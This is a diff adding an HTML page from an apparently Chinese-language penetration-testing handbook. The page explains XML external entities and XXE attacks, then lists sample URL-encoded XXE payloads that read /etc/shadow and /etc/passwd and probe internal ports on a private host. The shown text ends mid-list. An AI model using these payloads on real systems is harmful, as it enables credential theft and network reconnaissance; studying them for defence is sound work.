@@ -1,0 +1,1388 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XXE · 潜入你的网络：渗透测试</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Crifan Li <admin@crifan.com>">
+        
+        
+    
+    <link rel="stylesheet" href="../../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-anchors/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-disqus/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-callouts/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../../backend/" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"buttons":[{"repo":"infiltrate_your_net_penetration_testing","user":"crifan","type":"star","count":true,"size":"small"},{"user":"crifan","type":"follow","width":"120","count":false,"size":"small"}]};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="http://www.crifan.com" target="_blank" class="custom-link">主页</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../../">
+            
+                <a href="../../../../">
+            
+                    
+                        <b>1.1.</b>
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../../../penatration_test_overview/">
+            
+                <a href="../../../../penatration_test_overview/">
+            
+                    
+                        <b>1.2.</b>
+                    
+                    渗透测试概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                        <b>1.3.</b>
+                    
+                    渗透测试手段
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                        <b>1.3.1.</b>
+                    
+                    Web前端
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../../xss.html">
+            
+                <a href="../../xss.html">
+            
+                    
+                        <b>1.3.1.1.</b>
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../../csrf.html">
+            
+                <a href="../../csrf.html">
+            
+                    
+                        <b>1.3.1.2.</b>
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="../">
+            
+                <a href="../">
+            
+                    
+                        <b>1.3.1.3.</b>
+                    
+                    文件
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.3.1" data-path="../file_contain.html">
+            
+                <a href="../file_contain.html">
+            
+                    
+                        <b>1.3.1.3.1.</b>
+                    
+                    文件包含FI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3.2" data-path="../file_upload.html">
+            
+                <a href="../file_upload.html">
+            
+                    
+                        <b>1.3.1.3.2.</b>
+                    
+                    文件上传FU
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3.3" data-path="../foler_browser.html">
+            
+                <a href="../foler_browser.html">
+            
+                    
+                        <b>1.3.1.3.3.</b>
+                    
+                    目录浏览
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3.4" data-path="../any_file_read_download.html">
+            
+                <a href="../any_file_read_download.html">
+            
+                    
+                        <b>1.3.1.3.4.</b>
+                    
+                    任意文件读取和下载
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3.5" data-path="./">
+            
+                <a href="./">
+            
+                    
+                        <b>1.3.1.3.5.</b>
+                    
+                    XML文件
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1.3.5.1" data-path="xxe.html">
+            
+                <a href="xxe.html">
+            
+                    
+                        <b>1.3.1.3.5.1.</b>
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../../backend/">
+            
+                <a href="../../../backend/">
+            
+                    
+                        <b>1.3.2.</b>
+                    
+                    后端
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../../../backend/sql_injection.html">
+            
+                <a href="../../../backend/sql_injection.html">
+            
+                    
+                        <b>1.3.2.1.</b>
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../../../backend/rce_rci.html">
+            
+                <a href="../../../backend/rce_rci.html">
+            
+                    
+                        <b>1.3.2.2.</b>
+                    
+                    RCE/RCI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" data-path="../../../backend/ssrf.html">
+            
+                <a href="../../../backend/ssrf.html">
+            
+                    
+                        <b>1.3.2.3.</b>
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="../../../backend/cors.html">
+            
+                <a href="../../../backend/cors.html">
+            
+                    
+                        <b>1.3.2.4.</b>
+                    
+                    CORS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.5" data-path="../../../backend/unauthorized_access.html">
+            
+                <a href="../../../backend/unauthorized_access.html">
+            
+                    
+                        <b>1.3.2.5.</b>
+                    
+                    越权访问
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6" data-path="../../../backend/server_language/">
+            
+                <a href="../../../backend/server_language/">
+            
+                    
+                        <b>1.3.2.6.</b>
+                    
+                    后端语言
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.6.1" data-path="../../../backend/server_language/java/">
+            
+                <a href="../../../backend/server_language/java/">
+            
+                    
+                        <b>1.3.2.6.1.</b>
+                    
+                    Java
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.6.1.1" data-path="../../../backend/server_language/java/java_deserial.html">
+            
+                <a href="../../../backend/server_language/java/java_deserial.html">
+            
+                    
+                        <b>1.3.2.6.1.1.</b>
+                    
+                    JAVA反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6.1.2" data-path="../../../backend/server_language/java/struts2.html">
+            
+                <a href="../../../backend/server_language/java/struts2.html">
+            
+                    
+                        <b>1.3.2.6.1.2.</b>
+                    
+                    struts2
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../../../penetration_tool/">
+            
+                <a href="../../../../penetration_tool/">
+            
+                    
+                        <b>1.4.</b>
+                    
+                    渗透测试工具
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../../../penetration_tool/vulnerability_scan/">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/">
+            
+                    
+                        <b>1.4.1.</b>
+                    
+                    漏洞扫描类
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="../../../../penetration_tool/vulnerability_scan/metasploit.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/metasploit.html">
+            
+                    
+                        <b>1.4.1.1.</b>
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="../../../../penetration_tool/vulnerability_scan/appscan.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/appscan.html">
+            
+                    
+                        <b>1.4.1.2.</b>
+                    
+                    AppScan
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.3" data-path="../../../../penetration_tool/vulnerability_scan/awvs.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/awvs.html">
+            
+                    
+                        <b>1.4.1.3.</b>
+                    
+                    AWVS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.4" data-path="../../../../penetration_tool/vulnerability_scan/burp_suite.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/burp_suite.html">
+            
+                    
+                        <b>1.4.1.4.</b>
+                    
+                    Burp Suite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.5" data-path="../../../../penetration_tool/vulnerability_scan/cobalt_strike.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/cobalt_strike.html">
+            
+                    
+                        <b>1.4.1.5.</b>
+                    
+                    Cobalt Strike
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.6" data-path="../../../../penetration_tool/vulnerability_scan/nessus.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/nessus.html">
+            
+                    
+                        <b>1.4.1.6.</b>
+                    
+                    Nessus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.7" data-path="../../../../penetration_tool/vulnerability_scan/zap.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/zap.html">
+            
+                    
+                        <b>1.4.1.7.</b>
+                    
+                    ZAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.8" data-path="../../../../penetration_tool/vulnerability_scan/nikto.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/nikto.html">
+            
+                    
+                        <b>1.4.1.8.</b>
+                    
+                    Nikto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9" data-path="../../../../penetration_tool/vulnerability_scan/others/">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/">
+            
+                    
+                        <b>1.4.1.9.</b>
+                    
+                    其他
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.9.1" data-path="../../../../penetration_tool/vulnerability_scan/others/openvas.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/openvas.html">
+            
+                    
+                        <b>1.4.1.9.1.</b>
+                    
+                    OpenVAS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.2" data-path="../../../../penetration_tool/vulnerability_scan/others/xray.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/xray.html">
+            
+                    
+                        <b>1.4.1.9.2.</b>
+                    
+                    Xray
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.3" data-path="../../../../penetration_tool/vulnerability_scan/others/netsparker.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/netsparker.html">
+            
+                    
+                        <b>1.4.1.9.3.</b>
+                    
+                    NetSparker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.4" data-path="../../../../penetration_tool/vulnerability_scan/others/xss_scanner.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/xss_scanner.html">
+            
+                    
+                        <b>1.4.1.9.4.</b>
+                    
+                    XSS Scanner
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.5" data-path="../../../../penetration_tool/vulnerability_scan/others/n_stalker.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/n_stalker.html">
+            
+                    
+                        <b>1.4.1.9.5.</b>
+                    
+                    N-Stalker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.6" data-path="../../../../penetration_tool/vulnerability_scan/others/whisker.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/whisker.html">
+            
+                    
+                        <b>1.4.1.9.6.</b>
+                    
+                    Whisker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.7" data-path="../../../../penetration_tool/vulnerability_scan/others/sn1per.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/sn1per.html">
+            
+                    
+                        <b>1.4.1.9.7.</b>
+                    
+                    Sn1per
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.8" data-path="../../../../penetration_tool/vulnerability_scan/others/webscarab.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/webscarab.html">
+            
+                    
+                        <b>1.4.1.9.8.</b>
+                    
+                    WebScarab
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.9" data-path="../../../../penetration_tool/vulnerability_scan/others/webinspect.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/webinspect.html">
+            
+                    
+                        <b>1.4.1.9.9.</b>
+                    
+                    Webinspect
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9.10" data-path="../../../../penetration_tool/vulnerability_scan/others/wikto.html">
+            
+                <a href="../../../../penetration_tool/vulnerability_scan/others/wikto.html">
+            
+                    
+                        <b>1.4.1.9.10.</b>
+                    
+                    Wikto
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../../../../penetration_tool/port_scan/">
+            
+                <a href="../../../../penetration_tool/port_scan/">
+            
+                    
+                        <b>1.4.2.</b>
+                    
+                    端口扫描类
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" data-path="../../../../penetration_tool/port_scan/nmap/">
+            
+                <a href="../../../../penetration_tool/port_scan/nmap/">
+            
+                    
+                        <b>1.4.2.1.</b>
+                    
+                    nmap
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" data-path="../../../../penetration_tool/port_scan/nmap/zenmap.html">
+            
+                <a href="../../../../penetration_tool/port_scan/nmap/zenmap.html">
+            
+                    
+                        <b>1.4.2.1.1.</b>
+                    
+                    Zenmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" data-path="../../../../penetration_tool/port_scan/layer.html">
+            
+                <a href="../../../../penetration_tool/port_scan/layer.html">
+            
+                    
+                        <b>1.4.2.2.</b>
+                    
+                    Layer
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../../../../penetration_tool/injection/">
+            
+                <a href="../../../../penetration_tool/injection/">
+            
+                    
+                        <b>1.4.3.</b>
+                    
+                    注入类
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="../../../../penetration_tool/injection/sqlmap.html">
+            
+                <a href="../../../../penetration_tool/injection/sqlmap.html">
+            
+                    
+                        <b>1.4.3.1.</b>
+                    
+                    sqlmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="../../../../penetration_tool/injection/commix.html">
+            
+                <a href="../../../../penetration_tool/injection/commix.html">
+            
+                    
+                        <b>1.4.3.2.</b>
+                    
+                    commix
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../../../penetration_stage/">
+            
+                <a href="../../../../penetration_stage/">
+            
+                    
+                        <b>1.5.</b>
+                    
+                    渗透测试阶段
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../../../penetration_stage/pre_penetration.html">
+            
+                <a href="../../../../penetration_stage/pre_penetration.html">
+            
+                    
+                        <b>1.5.1.</b>
+                    
+                    渗透前
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../../../penetration_stage/penetrating.html">
+            
+                <a href="../../../../penetration_stage/penetrating.html">
+            
+                    
+                        <b>1.5.2.</b>
+                    
+                    渗透中
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../../../penetration_stage/post_penetration.html">
+            
+                <a href="../../../../penetration_stage/post_penetration.html">
+            
+                    
+                        <b>1.5.3.</b>
+                    
+                    后渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../../../penetration_related/">
+            
+                <a href="../../../../penetration_related/">
+            
+                    
+                        <b>1.6.</b>
+                    
+                    相关
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../../../../penetration_related/security_analysis/">
+            
+                <a href="../../../../penetration_related/security_analysis/">
+            
+                    
+                        <b>1.6.1.</b>
+                    
+                    安全分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../../../appendix/">
+            
+                <a href="../../../../appendix/">
+            
+                    
+                        <b>1.7.</b>
+                    
+                    附录
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../../../appendix/reference.html">
+            
+                <a href="../../../../appendix/reference.html">
+            
+                    
+                        <b>1.7.1.</b>
+                    
+                    参考资料
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../../.." >XXE</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="xxe"><a name="xxe" class="plugin-anchor" href="#xxe"><i class="fa fa-link" aria-hidden="true"></i></a>XXE</h1>
+<ul>
+<li>XML<ul>
+<li>&#x57FA;&#x7840;&#x77E5;&#x8BC6;<ul>
+<li>XML&#x4E2D;&#x53EF;&#x4EE5;&#x5F15;&#x5165;&#x5916;&#x90E8;&#x6587;&#x4EF6;<ul>
+<li>DTD&#xFF08;&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#xFF09;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5B9A;&#x4E49; XML &#x6587;&#x6863;&#x7684;&#x5408;&#x6CD5;&#x6784;&#x5EFA;&#x6A21;&#x5757;&#x3002;DTD &#x53EF;&#x4EE5;&#x5728; XML &#x6587;&#x6863;&#x5185;&#x58F0;&#x660E;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5916;&#x90E8;&#x5F15;&#x7528;</li>
+<li>&#x5F15;&#x7528;&#x5916;&#x90E8;DTD<ul>
+<li><code><span class="token doctype">&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; SYSTEM &quot;&#x6587;&#x4EF6;&#x540D;&quot;&gt;</span></code></li>
+<li>&#x6216;&#x8005;<ul>
+<li><code><span class="token doctype">&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; PUBLIC &quot;public_ID&quot; &quot;&#x6587;&#x4EF6;&#x540D;&quot;&gt;</span></code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>&#x5F15;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;<ul>
+<li><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">&#x5B9E;&#x4F53;&#x540D;&#x79F0;</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">&quot;URI&quot;</span><span class="token punctuation">&gt;</span></span></code></li>
+<li>&#x6216;&#x8005;<ul>
+<li><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">&#x5B9E;&#x4F53;&#x540D;&#x79F0;</span> <span class="token attr-name">PUBLIC</span> <span class="token attr-name">&quot;public_ID&quot;&quot;URI&quot;</span><span class="token punctuation">&gt;</span></span></code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>&#x5F53;&#x5141;&#x8BB8;&#x5F15;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x6076;&#x610F;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x5BFC;&#x81F4;&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x3001;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3001;&#x63A2;&#x6D4B;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x3001;&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;&#x7B49;&#x5371;&#x5BB3;<ul>
+<li>&#x4E0D;&#x540C;&#x7A0B;&#x5E8F;&#x652F;&#x6301;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x4E00;&#x6837;<ul>
+<li><img src="../../../../assets/img/xxe_diff_protocol_support_diff_file.png" alt="diff_protocol_support_diff_file"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>XXE</code>=<code>XML eXternal Entity</code>=<code>XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;</code></p>
+<ul>
+<li>-&gt; <ul>
+<li><code>XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x6CE8;&#x5165;</code></li>
+<li><code>XXE&#x6F0F;&#x6D1E;</code></li>
+<li><code>XXE&#x653B;&#x51FB;</code></li>
+</ul>
+</li>
+<li>&#x6982;&#x8FF0;<ul>
+<li>&#x4E00;&#x79CD;&#x9488;&#x5BF9; <code>&#x5F31;&#x914D;&#x7F6E;</code> = <code>&#x914D;&#x7F6E;&#x6709;&#x95EE;&#x9898;</code> &#x7684; <code>&#x89E3;&#x6790;XML&#x8F93;&#x5165;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;</code> = <code>XML&#x89E3;&#x6790;&#x5668;</code>=<code>XML parser</code>&#x7684;&#x653B;&#x51FB;<ul>
+<li>&#x5F53;&#x5305;&#x542B;&#x5BF9;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x5F15;&#x7528;&#x7684;XML&#x8F93;&#x5165;&#x662F;&#x7531;&#x5F31;&#x914D;&#x7F6E;&#x7684;XML&#x89E3;&#x6790;&#x5668;&#x5904;&#x7406;&#x65F6;&#x8BE5;&#x653B;&#x51FB;&#x5C31;&#x4F1A;&#x53D1;&#x751F;</li>
+<li>&#x5982;&#x679C;&#x6B63;&#x786E;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x80FD;&#x975E;&#x5E38;&#x4E25;&#x91CD;</li>
+</ul>
+</li>
+<li>2017&#x5E74;&#x7684;<code>OWSAP</code> 10&#x4E4B;&#x4E00;</li>
+</ul>
+</li>
+<li>&#x653B;&#x51FB;&#x7C7B;&#x578B;&#xFF1A;<code>&#x4EE3;&#x7801;&#x6CE8;&#x5165;&#x7C7B;</code></li>
+<li>&#x540E;&#x679C;&#xFF1A;&#x6CC4;&#x6F0F;&#x673A;&#x5BC6;&#x6570;&#x636E;<ul>
+<li>&#x5BFC;&#x81F4; ~= &#x6D89;&#x53CA;&#x5230;<ul>
+<li>&#x62D2;&#x7EDD;&#x670D;&#x52A1;</li>
+<li>&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;</li>
+<li>&#x7AEF;&#x53E3;&#x626B;&#x63CF;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>XXE&#x6F0F;&#x6D1E;&#x5229;&#x7528; = XXE&#x653B;&#x51FB;</p>
+<ul>
+<li>&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x5B58;&#x5728;XXE&#x6F0F;&#x6D1E;<ul>
+<li>&#x7B2C;&#x4E00;&#x6B65;&#xFF1A;&#x5C1D;&#x8BD5;&#x63D2;&#x5165;XML&#x539F;&#x5B57;&#x7B26;metacharacter</li>
+</ul>
+</li>
+<li>&#x6848;&#x4F8B;<ul>
+<li>&#x4EBF;&#x7B11;-Dos&#x653B;&#x51FB;</li>
+</ul>
+</li>
+<li><p>&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x4E3E;&#x4F8B;</p>
+<pre class="language-"><code class="lang-bash">http://192.168.0.145:65412/?xml<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPEexample <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">&quot;file%3A%2F%2F%2Fetc%2Fshadow&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>%26xxe%3B<span class="token operator">&lt;</span>%2Froot<span class="token operator">&gt;</span>
+
+http://192.168.0.145:65412/?xml<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPEexample <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM<span class="token string">&quot;file%3A%2F%2F%2Fetc%2Fpasswd&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>%26xxe%3B<span class="token operator">&lt;</span>%2Froot<span class="token operator">&gt;</span>
+
+http://192.168.0.145:65412/?xml<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPEexample <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM<span class="token string">&quot;http%3A%2f%2f192.168.0.145%3A22%2f123&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>%26xxe%3B<span class="token operator">&lt;</span>%2Froot<span class="token operator">&gt;</span>
+
+http://192.168.0.145:65412/?xml<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPEexample <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">&quot;http%3A%2f%2f192.168.0.145%3A23%2f123&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>%26xxe%3B<span class="token operator">&lt;</span>%2Froot<span class="token operator">&gt;</span>
+</code></pre>
+<ul>
